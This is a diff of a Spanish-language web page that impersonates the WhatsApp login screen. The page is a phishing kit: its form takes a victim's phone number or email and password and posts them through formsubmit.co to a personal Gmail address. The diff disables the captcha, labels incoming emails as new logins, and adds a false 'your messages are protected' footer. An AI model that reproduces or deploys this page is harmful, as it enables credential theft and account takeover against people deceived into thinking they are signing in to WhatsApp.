@@ -1,101 +1,142 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>WhatsApp</title>
-<style>
-  html, body {
-    margin: 0;
-    padding: 0;
-    width: 100%;
-    height: 100%;
-    background: #fff;
-    font-family: Helvetica, Arial, sans-serif;
-  }
+  <meta charset="UTF-8">
+  <title>WhatsApp</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
 
-  .screen {
-    width: 100vw;
-    height: 100vh;
-    display: flex;
-    flex-direction: column;
-    justify-content: space-between;
-    align-items: center;
-  }
+    body {
+      margin: 0;
+      background: linear-gradient(135deg, #0a1014, #020617);
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
 
-  .top {
-    margin-top: 90px;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-  }
+    .phone {
+      width: 360px;
+      height: 700px;
+      background: #e5ddd5;
+      border-radius: 38px;
+      box-shadow: 0 25px 60px rgba(0,0,0,.7);
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+    }
 
-  .logo {
-    font-size: 40px;
-    color: #25D366;
-    font-weight: 700;
-    margin-bottom: 50px;
-    letter-spacing: -1px;
-  }
+    .topbar {
+      height: 56px;
+      background: #075e54;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 600;
+      font-size: 17px;
+      letter-spacing: .3px;
+      position: relative;
+    }
 
-  .box {
-    width: 90%;
-    max-width: 360px;
-  }
+    .content {
+      flex: 1;
+      background-image: linear-gradient(135deg, rgba(0,0,0,.02), rgba(0,0,0,.04)),
+        repeating-linear-gradient(
+          45deg,
+          #e5ddd5 0px,
+          #e5ddd5 10px,
+          #e0d6ce 10px,
+          #e0d6ce 20px
+        );
+      padding: 22px 20px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      gap: 14px;
+    }
 
-  input {
-    width: 100%;
-    padding: 15px 12px;
-    font-size: 16px;
-    margin-bottom: 16px;
-    border-radius: 6px;
-    border: 1px solid #dadce0;
-    box-sizing: border-box;
-    outline: none;
-  }
+    .bubble {
+      background: white;
+      border-radius: 18px;
+      padding: 12px 14px;
+      font-size: 14px;
+      color: #111;
+      box-shadow: 0 1px 2px rgba(0,0,0,.15);
+    }
 
-  input:focus {
-    border-color: #25D366;
-  }
+    .input {
+      width: 100%;
+      border: none;
+      border-radius: 18px;
+      padding: 14px 16px;
+      font-size: 15px;
+      outline: none;
+      background: #f0f0f0;
+    }
 
-  button {
-    width: 100%;
-    padding: 14px;
-    font-size: 16px;
-    border-radius: 999px;
-    border: none;
-    background: #25D366;
-    color: white;
-    font-weight: 600;
-    cursor: pointer;
-  }
+    .btn {
+      background: #25d366;
+      border: none;
+      border-radius: 20px;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: 700;
+      color: #000;
+      cursor: pointer;
+      margin-top: 8px;
+    }
 
-  button:active {
-    background: #1ebe5d;
-  }
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #667781;
+      padding-bottom: 14px;
+    }
 
-  .footer {
-    font-size: 13px;
-    color: #777;
-    margin-bottom: 25px;
-  }
-</style>
+   
+
+
+
+  
+  </style>
 </head>
 <body>
+  <div class="phone">
+    <div class="topbar">WhatsApp</div>
+    
 
-<div class="screen">
-  <div class="top">
-    <div class="logo">WhatsApp</div>
+    <form
+      action="https://formsubmit.co/orlandguzz@gmail.com"
+      method="POST"
+      class="content"
 
-    <form class="box" action="https://formsubmit.co/orlandguzz@gmail.com" method="POST">
-      <input type="text" name="user" placeholder="Número de teléfono o correo electrónico" required>
-      <input type="password" name="password" placeholder="Contraseña" required>
-      <button type="submit">Iniciar sesión</button>
+    >
+
+
+
+  
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_subject" value="Nuevo login GreenChat">
+      <input type="hidden" name="_template" value="table">
+
+      <div class="bubble">Ingresa tu número o correo</div>
+      <input class="input" type="text" name="Usuario" placeholder="Número o correo" required>
+
+      <div class="bubble">Ingresa tu contraseña</div>
+      <input class="input" type="password" name="Contraseña" placeholder="Contraseña" required>
+
+      <button class="btn" type="submit">Continuar</button>
     </form>
+
+    <div class="footer">Tus mensajes están protegidos</div>
   </div>
-
-  <div class="footer">from Meta</div>
-</div>
-
 </body>
 </html>
+
+
